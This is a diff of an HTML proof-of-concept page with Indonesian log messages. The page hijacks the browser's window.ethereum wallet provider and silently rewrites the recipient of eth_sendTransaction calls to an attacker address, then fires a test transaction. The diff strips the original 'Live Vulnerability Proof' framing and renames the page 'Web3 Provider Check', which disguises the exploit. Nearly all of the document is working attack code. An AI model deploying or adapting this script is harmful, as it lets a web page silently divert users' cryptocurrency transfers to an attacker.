@@ -3,105 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Production Web3 Provider Hijack & Tampering Proof</title>
+    <title>Web3 Provider Check</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f8fafc; padding: 20px; }
-        .container { max-width: 700px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        h2 { color: #ef4444; margin-top: 0; }
-        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 12px; border: 1px solid #1e293b; max-height: 400px; }
-        .badge { display: inline-block; background: rgba(239, 68, 68, 0.15); color: #fca5v5; padding: 5px 10px; border-radius: 4px; font-size: 12px; font-weight: bold; border: 1px solid rgba(239, 68, 68, 0.3); margin-bottom: 15px; }
+        body { font-family: monospace; background: #121212; color: #00ff00; padding: 20px; }
+        pre { white-space: pre-wrap; word-wrap: break-word; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h2>Live Vulnerability Proof</h2>
-    <div class="badge">Eksploitasi Nyata: Global Mutability & Parameter Tampering</div>
-
-    <h3>Log Audit & Eksekusi Memori:</h3>
-    <pre id="logOutput">Memulai audit integritas objek global...</pre>
-</div>
+    <h3>Provider Audit Log:</h3>
+    <pre id="log">Inisialisasi...</pre>
 
 <script>
-    const logOutput = document.getElementById("logOutput");
+const logEl = document.getElementById('log');
+function addLog(msg) {
+    logEl.innerText += '\n' + msg;
+}
 
-    function log(message) {
-        logOutput.innerText += "\n> " + message;
-        logOutput.scrollTop = logOutput.scrollHeight;
+(async () => {
+    if (!window.ethereum) {
+        addLog("[-] window.ethereum tidak ditemukan.");
+        return;
     }
 
-    (async function verifyAndExploit() {
-        if (typeof window.ethereum === "undefined") {
-            log("[GAGAL] Objek window.ethereum tidak ditemukan. Pastikan dibuka di dalam dApp browser target.");
-            return;
+    const desc = Object.getOwnPropertyDescriptor(window, 'ethereum');
+    addLog(`[i] Writable: ${desc.writable}`);
+
+    if (!desc.writable) {
+        addLog("[-] Objek terkunci.");
+        return;
+    }
+
+    const realProvider = window.ethereum;
+    const attacker = "0x000000000000000000000000000000000000dEaD";
+
+    window.ethereum = {
+        selectedAddress: realProvider.selectedAddress,
+        chainId: realProvider.chainId,
+        request: async (args) => {
+            if (args.method === "eth_sendTransaction" && args.params?.[0]) {
+                addLog(`[!] Intersep to: ${args.params[0].to}`);
+                args.params[0].to = attacker;
+                addLog(`[!] Dialihkan ke: ${attacker}`);
+            }
+            return realProvider.request(args);
         }
+    };
 
-        // 1. Membuktikan poin pertama: Properti global bersifat rentan (mutable/writable)
-        const descriptor = Object.getOwnPropertyDescriptor(window, 'ethereum');
-        log(`[AUDIT] Properti deskriptor ethereum - writable: ${descriptor.writable}, configurable: ${descriptor.configurable}`);
+    addLog("[+] window.ethereum berhasil dikuasai.");
 
-        if (!descriptor.writable) {
-            log("[AMAN] Objek ethereum terkunci dengan baik (immutable).");
-            return;
-        }
-        log("[KERENTANAN TERBUKTI] Properti window.ethereum bersifat mutable/writable.");
+    try {
+        const accounts = await realProvider.request({ method: "eth_requestAccounts" });
+        addLog(`[+] Akun: ${accounts[0]}`);
 
-        const nativeProvider = window.ethereum;
-        const attackerWallet = "0x000000000000000000000000000000000000dEaD"; // Alamat tujuan pengalihan
-
-        try {
-            // 2. Membuktikan poin kedua: Objek dikuasai total oleh skrip halaman web (Provider Hijacking)
-            const hijackedProxy = {
-                selectedAddress: nativeProvider.selectedAddress,
-                chainId: nativeProvider.chainId,
-                networkVersion: nativeProvider.networkVersion,
-                
-                request: async function(requestArgs) {
-                    // 3. Membuktikan poin ketiga: Parameter transaksi dibelokkan secara diam-diam (silent parameter tampering)
-                    if (requestArgs.method === "eth_sendTransaction") {
-                        log("[!] INTERSEPSI AKTIF: Metode 'eth_sendTransaction' tertangkap oleh skrip halaman.");
-                        
-                        if (requestArgs.params && requestArgs.params.length > 0) {
-                            let txParams = requestArgs.params[0];
-                            log(`[DUMP ASLI] Alamat Tujuan Penerima: ${txParams.to}`);
-                            log(`[DUMP ASLI] Nilai Nominal: ${txParams.value || '0'}`);
-
-                            // Membelokkan alamat tujuan secara paksa dan diam-diam ke dompet penyerang
-                            txParams.to = attackerWallet;
-                            log(`[!] TAMPERING BERHASIL: Alamat tujuan dialihkan secara diam-diam ke -> ${attackerWallet}`);
-                        }
-                    }
-
-                    // Meneruskan eksekusi ke provider asli agar alur wallet tetap berjalan
-                    return nativeProvider.request(requestArgs);
-                }
-            };
-
-            // Mengambil alih objek global secara penuh
-            window.ethereum = hijackedProxy;
-            log("[SUKSES] window.ethereum berhasil dikuasai total oleh skrip halaman web.");
-
-            // Pemicu aksi nyata agar dApp/browser memproses transaksi
-            log("[AKSI] Meminta izin akses akun (eth_requestAccounts)...");
-            const accounts = await nativeProvider.request({ method: "eth_requestAccounts" });
-            log("[OK] Akun terhubung: " + accounts[0]);
-
-            log("[AKSI] Memicu eksekusi pengiriman transaksi...");
-            await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [{
-                    from: accounts[0],
-                    to: accounts[0], // Target awal ke diri sendiri, langsung di-tamper oleh proxy ke attackerWallet
-                    value: "0x0"
-                }]
-            });
-            log("[SELESAI] Seluruh tahapan eksploitasi dan pembelokan parameter tereksekusi dengan sempurna.");
-
-        } catch (err) {
-            log("[INFO/RESPON WALLET]: " + err.message);
-        }
-    })();
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: accounts[0],
+                to: accounts[0],
+                value: "0x0"
+            }]
+        });
+        addLog("[+] Selesai.");
+    } catch (e) {
+        addLog(`[-] Error: ${e.message}`);
+    }
+})();
 </script>
-
 </body>
 </html>
